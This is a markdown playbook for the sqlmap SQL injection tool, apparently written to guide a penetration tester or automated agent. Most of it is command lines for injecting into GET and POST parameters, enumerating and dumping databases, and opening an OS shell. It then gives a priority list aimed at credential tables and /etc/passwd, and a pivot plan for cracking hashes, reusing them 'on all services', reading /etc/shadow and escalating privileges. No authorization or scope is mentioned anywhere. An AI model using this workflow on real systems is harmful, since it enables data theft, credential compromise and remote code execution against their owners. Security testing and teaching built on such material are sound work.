# sqlmap — SQL Injection Automation

## Why
Automates detection and exploitation of SQL injection. Can extract databases, execute commands, read files. HIGH risk tool.

## When to Use

| Signal | Action |
|---|---|
| Parameter-based URL found | Test for SQLi |
| Login form with no CSRF | Test post params |
| Error-based hints in response | SQL errors visible → likely injectable |
| Search/filter functionality | Common injection points |
| API with query params | Test each parameter |

## Detection Signals (run sqlmap when you see these)

```
- SQL error messages in responses
- ' causes 500 error
- Different response for id=1 vs id=1'
- UNION keyword not filtered
- Parameter directly in query (search?q=, id=, user=, cat=)
```

## Common Invocations

```bash
# GET parameter test
sqlmap -u "http://<target>/page?id=1" --batch

# POST parameter test
sqlmap -u "http://<target>/login" --data="user=a&pass=b" --batch

# With cookie/session
sqlmap -u "http://<target>/page?id=1" --cookie="PHPSESSID=abc123" --batch

# Enumerate databases
sqlmap -u "<url>" --dbs --batch

# Enumerate tables
sqlmap -u "<url>" -D <dbname> --tables --batch

# Dump table
sqlmap -u "<url>" -D <dbname> -T <table> --dump --batch

# OS shell (if possible)
sqlmap -u "<url>" --os-shell --batch

# Specific technique
sqlmap -u "<url>" --technique=BEU --batch
# B=boolean, E=error, U=union, S=stacked, T=time
```

## Parsing Priorities

1. **Injectable parameter** → which param, what type of SQLi
2. **Database type** → MySQL, PostgreSQL, MSSQL, SQLite
3. **Available databases** → target juicy ones (users, admin, config)
4. **Credential tables** → usernames + hashes
5. **File read capability** → /etc/passwd, config files
6. **OS shell capability** → direct RCE

## Junior Mistakes

- Testing non-parameterized URLs (no injection point)
- Not using `--batch` (hangs waiting for input)
- Running against CSRF-protected forms without token handling
- Not specifying the injectable parameter (`-p param`)
- Going straight to `--dump-all` (too slow, too noisy — target specific tables)
- Forgetting cookies/auth tokens for authenticated endpoints

## Pivot After sqlmap

```
Creds found in DB?     → crack hashes → try on all services
File read works?       → /etc/passwd, /etc/shadow, config files
OS shell works?        → you have RCE, enumerate + privesc
DB type identified?    → version-specific exploits
Nothing injectable?    → move to other attack vectors
```
